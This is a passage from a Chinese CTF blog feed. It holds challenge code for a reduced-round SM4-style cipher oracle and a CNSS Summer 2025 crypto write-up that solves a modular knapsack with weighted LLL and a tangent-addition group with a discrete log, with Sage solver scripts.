class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">FK = (</span><br><span class="line">    <span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">CK = (</span><br><span class="line">    <span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>,</span><br><span class="line">    <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>,</span><br><span class="line">    <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>,</span><br><span class="line">    <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>, <span class="number">0xA4ABB2B9</span>,</span><br><span class="line">    <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>,</span><br><span class="line">    <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>,</span><br><span class="line">    <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>,</span><br><span class="line">    <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">l2b = <span class="keyword">lambda</span> x: x.to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">b2l = <span class="keyword">lambda</span> x: <span class="built_in">int</span>.from_bytes(x, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">τ   = <span class="keyword">lambda</span> x: b2l(<span class="built_in">bytes</span>(S[y] <span class="keyword">for</span> y <span class="keyword">in</span> l2b(x)))</span><br><span class="line">rol = <span class="keyword">lambda</span> x, y: ((x &lt;&lt; y) | (x &gt;&gt; (<span class="number">32</span> - y))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">L   = <span class="keyword">lambda</span> x: x ^ rol(x, <span class="number">2</span>) ^ rol(x, <span class="number">10</span>) ^ rol(x, <span class="number">18</span>) ^ rol(x, <span class="number">24</span>)</span><br><span class="line">L_  = <span class="keyword">lambda</span> x: x ^ rol(x, <span class="number">13</span>) ^ rol(x, <span class="number">23</span>)</span><br><span class="line">T   = <span class="keyword">lambda</span> x: L(τ(x))</span><br><span class="line">T_  = <span class="keyword">lambda</span> x: L_(τ(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_block</span>(<span class="params">key, block, nr=<span class="number">32</span></span>):</span><br><span class="line">    K = [b2l(key[i : i + <span class="number">4</span>]) ^ FK[i // <span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    X = [b2l(block[i : i + <span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nr):</span><br><span class="line">        K += [K[i] ^ T_(CK[i] ^ K[i + <span class="number">1</span>] ^ K[i + <span class="number">2</span>] ^ K[i + <span class="number">3</span>])]</span><br><span class="line">        X += [X[i] ^ T(X[i + <span class="number">1</span>] ^ X[i + <span class="number">2</span>] ^ X[i + <span class="number">3</span>] ^ K[i + <span class="number">4</span>])]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(l2b(X[nr + <span class="number">3</span> - i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">key, pt, nr=<span class="number">32</span></span>):</span><br><span class="line">    pt = pad(pt, <span class="number">16</span>)</span><br><span class="line">    ct = <span class="built_in">bytes</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        ct += enc_block(key, strxor(pt[i : i + <span class="number">16</span>], ct[-<span class="number">16</span> : ]), nr)</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span> : ]</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(enc(key, FLAG.encode()).<span class="built_in">hex</span>())</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pt = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(enc(key, pt, <span class="number">10</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;还是太难了QWQ，等补档了……&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;wp参考&lt;br&gt;&lt;a href=&quot;https://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2&quot;&gt;https://c1oudfl0</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CNSS-Summer2025-Crypto-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/</id>
    <published>2025-08-25T17:56:23.000Z</published>
    <updated>2025-10-08T15:32:47.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>原来是这样，去年招新赛的题放到了<code>summer</code>，那新生就惨喽<br><img src="https://pic1.zhimg.com/80/v2-ef479dc976e8fcf11df6c18fd79be748_1440w.png" alt=""></p><h2 id="task1-😴-苦昼短"><a href="#task1-😴-苦昼短" class="headerlink" title="task1(😴 苦昼短)"></a>task1(😴 苦昼短)</h2><p>见<a href="https://hvang10.github.io/2024/10/10/cnss-recruit-2024">cnss-recruit-2024😴 苦昼短</a></p><h2 id="O…OFB-🐬-詩超絆"><a href="#O…OFB-🐬-詩超絆" class="headerlink" title="O…OFB ?(🐬 詩超絆)"></a>O…OFB ?(🐬 詩超絆)</h2><p>见<a href="https://hvang10.github.io/2024/10/10/cnss-recruit-2024">cnss-recruit-2024🐬 詩超絆</a></p><h2 id="线…线性规划？-😭-声声慢"><a href="#线…线性规划？-😭-声声慢" class="headerlink" title="线…线性规划？(😭 声声慢)"></a>线…线性规划？(😭 声声慢)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">640</span></span><br><span class="line">n = getRandomNBitInteger(nbits)</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line">a = []</span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ai = getRandomNBitInteger(nbits)</span><br><span class="line">    xi = getRandomNBitInteger(<span class="number">64</span> + <span class="number">32</span> * i)</span><br><span class="line">    a.append(ai)</span><br><span class="line">    x.append(xi)</span><br><span class="line">    s += ai * xi</span><br><span class="line"></span><br><span class="line">k = s//n</span><br><span class="line">s %= n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a = &#125;</span>&quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;cnss&#123;&#x27;</span>+<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> x])+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 3904064643893390361433617712655100029912556632089667501554029429639468928393101622043906144668453264281530453865022580589294831765389441377916901119131234356458963290551834945708721353433505601</span></span><br><span class="line"><span class="string">s = 3604875074795055000123916123224108624958126368977597327049275476975598192797160984462664525867166641119496011661706120902314295453633878065433943707394662052729528152546793152201914658255139867</span></span><br><span class="line"><span class="string">a = [2730885493586765190463536251928549081027650544135162075248013764093382819365134392595553863394291517552006396494131206919459935145536152218329288354821904074559120766005594153544756912098945832, 2682794543299249423965520585343408877939482776908813108080125635950617712534116358263875473393216488846715164240099514620137387390122653676168840502450478268278599148289754303414710910342195076, 3056310241622299025529837725147575615329254835813066425883457571781120647010672396603486688297231719653298145480220955878347533091003144227093892753771160874705140077267221046644815086744932854, 4118287861218613731723595777607376442710273799564235506091542746021449841390393039734820750495517116647742753148077759431161482333337542591059373997816043305851015242515503798301490457740269149]</span></span><br><span class="line"><span class="string">flag = cnss&#123;***&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>说实话，这题的<strong>格</strong>很好构造，一目了然</p><script type="math/tex; mode=display">\left [ \begin{matrix}k&x_{0}&x_{1}&x_{2}&x_{3}\\\end{matrix} \right ]*\left [ \begin{matrix}-n&0&0&0&0\\a_{0}&1&0&0&0\\a_{1}&0&1&0&0\\a_{2}&0&0&1&0\\a_{3}&0&0&0&1\\\end{matrix} \right ]\ =\left [ \begin{matrix}s&x_{0}&x_{1}&x_{2}&x_{3}\end{matrix} \right ]</script><p>这里我还没<strong>未配平</strong>，然而就算配平(目标向量平衡在<code>160bits</code>)之后，<strong>LLL</strong>规约出来的目标向量第一个居然是<code>n</code>？？？wtf</p><p>不理解，然后拷打<code>GPT</code>一番，发现它更是一坨，感觉根本不懂什么是配平，当然代码依旧一坨</p><p>随之转战<strong>Gemini 2.5Pro</strong>，这一次它构造的格和我们<strong>稍微不一样</strong>(最下面一行，它把0给规约出来了)，虽然我前面也想到了，拷打了两次，第二次调教一下配平(与<code>k</code><strong>平衡</strong>)，比<code>GPT</code>好用多了</p><p><strong>大常数C</strong>最重要(最好是2**160起步，但实际手测最小为2^137)，可能我之前也是缺这么个东西，导致规约出来的向量不理想(?)<br>其实之前也从别人<code>wp</code>看到过类似的情况，但自己还没有碰到过，算是长眼了</p><p>问AI补了一下知识：<strong>LLL算法</strong>找的是<strong>格L</strong>中的<strong>向量v</strong>，它的<strong>欧几里得范数</strong>要<strong>尽可能小</strong><br>如果解(<strong>v=c·L</strong>)正确(<strong>c=x0,x1,x2,x3,-k,1</strong>)，<strong>范数平方(最小)</strong>为$(x_{0}W_{0})^{2}+(x_{1}W_{1})^{2}+(x_{2}W_{2})^{2}+(x_{3}W_{3})^{2}+(kW_{4})^{2}+0$<br>大概会在$(x_{0}W_{0})^{2}$这个数量级(<strong>常数</strong>)附近位置(再大一点)，但如果解不正确，这时候我们假设<code>C</code>，范数平方会大于<code>(C·Z)^2</code>，且至少为<code>C^2</code><br>这是<strong>最坏</strong>的一种情况，但如果我们让 $C^{2}&gt;(x_{0}W_{0})^{2}$，我们就确保了<strong>下界</strong>，可以找到最小的欧几里得范数(正解)，从而找到目标向量v</p><blockquote><p>感觉还是有点小瑕疵，反正差不多就这个意思</p></blockquote><script type="math/tex; mode=display">\left [ \begin{matrix}x_{0}&x_{1}&x_{2}&x_{3}&-k&1\\\end{matrix} \right ]*\left [ \begin{matrix}W_{0}&0&0&0&0&C*a_{0}\\0&W_{1}&0&0&0&C*a_{1}\\0&0&W_{2}&0&0&C*a_{2}\\0&0&0&W_{3}&0&C*a_{3}\\0&0&0&0&W_{4}&C*n\\0&0&0&0&0&C*(-s)\\\end{matrix} \right ]\ =\left [ \begin{matrix}W_{0}x_{0}&W_{1}x_{1}&W_{2}x_{2}&W_{3}x_{3}&W_{4}(-k)&0\end{matrix} \right ]</script><p>$其实这题是flag2，因为flag1的x1位数固定，直接考flag2即可跳过flag1$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">3904064643893390361433617712655100029912556632089667501554029429639468928393101622043906144668453264281530453865022580589294831765389441377916901119131234356458963290551834945708721353433505601</span></span><br><span class="line">s = <span class="number">3604875074795055000123916123224108624958126368977597327049275476975598192797160984462664525867166641119496011661706120902314295453633878065433943707394662052729528152546793152201914658255139867</span></span><br><span class="line">a = [<span class="number">2730885493586765190463536251928549081027650544135162075248013764093382819365134392595553863394291517552006396494131206919459935145536152218329288354821904074559120766005594153544756912098945832</span>, <span class="number">2682794543299249423965520585343408877939482776908813108080125635950617712534116358263875473393216488846715164240099514620137387390122653676168840502450478268278599148289754303414710910342195076</span>, <span class="number">3056310241622299025529837725147575615329254835813066425883457571781120647010672396603486688297231719653298145480220955878347533091003144227093892753771160874705140077267221046644815086744932854</span>, <span class="number">4118287861218613731723595777607376442710273799564235506091542746021449841390393039734820750495517116647742753148077759431161482333337542591059373997816043305851015242515503798301490457740269149</span>]</span><br><span class="line"></span><br><span class="line">W = [</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">64</span>),</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">96</span>),</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">128</span>),</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">160</span>),</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">]</span><br><span class="line">C = n</span><br><span class="line">M = Matrix(ZZ, [</span><br><span class="line">    [W[<span class="number">0</span>], <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    C * a[<span class="number">0</span>]],</span><br><span class="line">    [<span class="number">0</span>,    W[<span class="number">1</span>], <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    C * a[<span class="number">1</span>]],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    W[<span class="number">2</span>], <span class="number">0</span>,    <span class="number">0</span>,    C * a[<span class="number">2</span>]],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    W[<span class="number">3</span>], <span class="number">0</span>,    C * a[<span class="number">3</span>]],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    W[<span class="number">4</span>], C * n],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    C * (-s)]</span><br><span class="line">])</span><br><span class="line">res = M.LLL()</span><br><span class="line"><span class="keyword">if</span> res[<span class="number">0</span>][<span class="number">5</span>] == <span class="number">0</span>:</span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        x.append(Integer(<span class="built_in">round</span>(res[<span class="number">0</span>][i] / W[i])))</span><br><span class="line">    X = [<span class="built_in">abs</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> x]</span><br><span class="line">    flag = <span class="string">&#x27;cnss&#123;&#x27;</span> + <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> X]) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found x values: <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not found&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="三…三角函数？-🚗-narcissu"><a href="#三…三角函数？-🚗-narcissu" class="headerlink" title="三…三角函数？(🚗 narcissu)"></a>三…三角函数？(🚗 narcissu)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">P = <span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> isPrime(P):</span><br><span class="line">    lis = [getPrime(<span class="number">48</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">    P = <span class="number">1</span> + <span class="number">4</span> * reduce(<span class="keyword">lambda</span> x, y: x * y, lis)</span><br><span class="line">x1 = getRandomInteger(<span class="number">6</span> * <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(x, -<span class="number">1</span>, P)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x1: <span class="built_in">int</span>, x2: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (x1 + x2) * inv(<span class="number">1</span> - x1 * x2) % P</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    tmp = a</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">            ans = add(ans, tmp)</span><br><span class="line">        tmp = add(tmp, tmp)</span><br><span class="line">        y &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x2 = mul(x1, bytes_to_long(flag))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;P = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x1 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x2 = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">P = 472958314625001949286760892821211871536814324967123614257153023707299229675608813176509</span></span><br><span class="line"><span class="string">x1 = 238328866712703378513058278097596198883342987522679076735041467171358733524094199996347</span></span><br><span class="line"><span class="string">x2 = 142236542616006661645511771838641346094908915542395871010964119785370551657030998834210</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>$这题的加法很眼熟，加上题目提示的三角函数，得到tan(\alpha+\beta)=\frac{tan(\alpha)+tan(\beta)}{1+tan(\alpha)tan(\beta)}的形式$<br>$而乘法是通过加法实现的，称之为标量乘法，令x=tan(\theta)$<br><code>x2 = mul(x1, bytes_to_long(flag))</code>可以理解为$tan(\theta_{2})=tan(\theta_{1}·m)$<br>$我们利用复数和欧拉公式做这样的一个映射$<br>$\phi(x)=\frac{1+i·x}{1-i·x}，i^{2}\equiv -1\ mod\ P，其中P=4k+1，表明平方根i存在(二次剩余QR)$<br>$根据欧拉公式，e^{i\theta}=cos(\theta)+isin(\theta)$<br>$有\phi(tan(\theta))=\frac{1+i\frac{sin(\theta)}{cos(\theta)}}{1-i\frac{sin(\theta)}{cos(\theta)}}=\frac{cos(\theta)+isin(\theta)}{cos(\theta)-isin(\theta)}=\frac{e^{i\theta}}{e^{-i\theta}}=e^{2i\theta}$<br>$\phi(add(x_{1},x_{2}))=\phi(tan(\theta_{1}+\theta_{2}))=e^{2i(\theta_{1}+\theta_{2})}=\phi(x_{1})·\phi(x_{2})$<br>$\phi(x_{2})=\phi(mul(x_{1},m))=\phi(x_{1})^{m}，因为乘法是通过倍加实现的$<br>$到了这一步就成了我们熟悉的离散对数DLP，只需要在模P的整数域中找到-1的模平方根即可$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">P = <span class="number">472958314625001949286760892821211871536814324967123614257153023707299229675608813176509</span></span><br><span class="line">x1 = <span class="number">238328866712703378513058278097596198883342987522679076735041467171358733524094199996347</span></span><br><span class="line">x2 = <span class="number">142236542616006661645511771838641346094908915542395871010964119785370551657030998834210</span></span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">Fp = Zmod(P)</span><br><span class="line">i_p = Fp(-<span class="number">1</span>).sqrt()</span><br><span class="line"></span><br><span class="line">x1_fp = Fp(x1)</span><br><span class="line">x2_fp = Fp(x2)</span><br><span class="line">g_plus = (<span class="number">1</span> + i_p * x1_fp) / (<span class="number">1</span> - i_p * x1_fp)</span><br><span class="line">h_plus = (<span class="number">1</span> + i_p * x2_fp) / (<span class="number">1</span> - i_p * x2_fp)</span><br><span class="line"></span><br><span class="line">order = P - <span class="number">1</span></span><br><span class="line"><span class="comment"># 在 Fp 上求解</span></span><br><span class="line">m = discrete_log(h_plus, g_plus, <span class="built_in">ord</span>=order)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;🚩 Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] time: <span class="subst">&#123;end - start&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">🚩 Flag: 